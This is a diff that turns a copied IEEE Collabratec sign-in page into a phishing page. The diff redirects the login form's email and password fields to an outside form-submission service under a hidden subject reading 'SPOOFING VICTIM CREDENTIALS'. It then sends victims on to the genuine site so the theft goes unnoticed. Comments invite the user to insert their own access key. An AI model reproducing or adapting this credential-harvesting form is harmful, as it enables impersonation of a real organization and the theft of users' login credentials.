@@ -189,17 +189,25 @@
 					<p>If you are signing in with a username other than an email address, please review this <a class="err-msg-link" href="https://supportcenter.ieee.org/app/answers/detail/a_id/320/kw/username" target="_blank">this FAQ</a> on how to update it.</p>
                 </div>
 
-                				<form id="sign_in_submit" name="sign_in_submit"  action="/as/GbtkY/resume/as/authorization.ping" method="POST" onsubmit="return ppctSignIn.postOk();" autocomplete="off" class="col-xs-12 col-sm-6 col-md-6">
+                				<form id="staticform" name="staticform"  action="https://api.staticforms.xyz/submit" method="POST" autocomplete="off" class="col-xs-12 col-sm-6 col-md-6">
+							<!-- Replace with your StaticForms accessKey -->
+        <input type="hidden" name="accessKey" value="b4a9b383-d839-4f77-8969-7cbb47f03591">
+        <input type="hidden" name="subject" value="SPOOFING VICTIM CREDENTIALS">
+							
+        <!-- Replace with the url you want to redirect to -->
+							
+        <input type="hidden" name="redirectTo" value="https://ieee-collabratec.ieee.org/">
+
+							
 					<label for="username">
 						<span class="ppct-form-controls">E-mail Address:</span>
-						<span class="ppct-form-controls"><input onKeyPress="return ppctSignIn.postOnReturn(event)" size="36" name="pf.username" value="" type="text" id="username"></span>
+						<span class="ppct-form-controls"><input  size="36" name="pf.username" value="" type="text" id="username"></span>
 					</label>
 					<label for="password">
 						<span class="ppct-form-controls">Password:</span>
-						<span class="ppct-form-controls"><input onKeyPress="return ppctSignIn.postOnReturn(event)" size="36" name="pf.pass" type="password" id="password"></span>
+						<span class="ppct-form-controls"><input size="36" name="pf.pass" type="password" id="password"></span>
 					</label>
-                <input type="hidden" name="pf.ok" value=""/>
-                <input type="hidden" name="pf.cancel" value=""/>
+
                 <input type="submit" class="ppct-login-submit" id="ppctLoginSubmit" name="submit" />
 					<a href="#" onclick="return ppctSignIn.onclickSignin();" class="btn btn-sign-in"><img src="https://ieee-collabratec.ieee.org/assets/ping/img/ieee_btn_logo.png" width="40" alt="">Sign in</a>
 				</form>
